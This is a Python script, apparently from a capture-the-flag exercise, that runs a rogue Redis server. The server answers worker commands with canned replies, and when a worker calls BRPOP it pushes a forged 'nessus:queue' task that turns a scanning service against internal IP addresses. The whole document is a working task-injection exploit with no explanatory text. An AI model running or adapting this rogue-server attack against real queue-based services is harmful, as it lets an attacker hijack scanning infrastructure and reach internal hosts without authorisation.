import socket
import json

HOST = '0.0.0.0'
PORT = 6379

task = {
    "task_id": "flag_hunt_v1",
    "trace_id": "pwn",
    "scanner_pool": "nessus",
    "scan_type": "untrusted",
    "payload": {
        "targets": ["172.32.0.204", "172.32.0.101"],
        "name": "flag_hunt",
        "description": "Pwned by Rogue Redis",
        "credentials": {}
    }
}

task_json = json.dumps(task)
response = f"*2\r\n$12\r\nnessus:queue\r\n${len(task_json)}\r\n{task_json}\r\n"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print(f"Listening on {HOST}:{PORT}")
    
    while True:
        conn, addr = s.accept()
        print(f"Connected by {addr}")
        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print(f"Received: {data}")
                
                if b"BRPOP" in data:
                    print("Sending task...")
                    conn.sendall(response.encode())
                elif b"PING" in data:
                    conn.sendall(b"+PONG\r\n")
                elif b"CLIENT" in data:
                    conn.sendall(b"+OK\r\n")
                elif b"INFO" in data:
                    conn.sendall(b"$0\r\n\r\n")
                else:
                    conn.sendall(b"+OK\r\n")
